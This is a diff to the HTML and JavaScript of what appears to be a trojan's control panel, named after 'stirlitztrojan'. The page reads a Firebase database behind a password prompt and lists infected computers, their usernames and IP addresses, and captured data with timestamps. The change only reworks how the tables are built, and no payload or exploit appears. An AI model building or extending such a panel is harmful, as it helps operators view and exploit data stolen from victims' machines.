@@ -10,21 +10,16 @@
   </head>
   <body>
     <h1>Users:</h1>
-    <table id="userTable">
-      <tr><th>Computer</th><th>Username</th><th>IP</th></tr>
-    </table>
-    <h1>Data:</h1>
-    <table id="dataTable">
-      <tr><th>Computer</th><th>Username</th><th>Data</th><th>Time</th><th>Date</th></tr>
-    </table>
+    <div id="data"></div>
     <div id="err"></div>
     <p>Copyright 2016 "I"</p>
     <script>
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
     firebase.on("value", function(snapshot) {
-      var rows, color;
+      var table, rows, color;
       
+      document.getElementById("data").appendChild(table = document.createElement("TABLE"));
       rows = snapshot.val().user;
       color = "#cccccc";
       for (var key in rows) {
@@ -36,7 +31,7 @@
           var username =  name.split("&")[1];
           var ip =        ReplaceAll(name.split("&")[2], "-", ".");
           // New row:
-          var tableRow = document.getElementById("userTable").insertRow(2);
+          var tableRow = table.insertRow(2);
           tableRow.style.backgroundColor = color;
           if(color == "#cccccc") color = "#aaaaaa";
           else color = "#cccccc";
@@ -52,6 +47,7 @@
         }
       }
       
+      document.getElementById("data").appendChild(table = document.createElement("TABLE"));
       rows = snapshot.val().data;
       color = "#cccccc";
       for (var key in rows) {
@@ -65,7 +61,7 @@
           var time = name.split(",")[1].split("&")[1];
           var date = name.split(",")[1].split("&")[0];
           // New row:
-          var tableRow = document.getElementById("dataTable").insertRow(2);
+          var tableRow = table.insertRow(2);
           tableRow.style.backgroundColor = color;
           if(color == "#cccccc") color = "#aaaaaa";
           else color = "#cccccc";
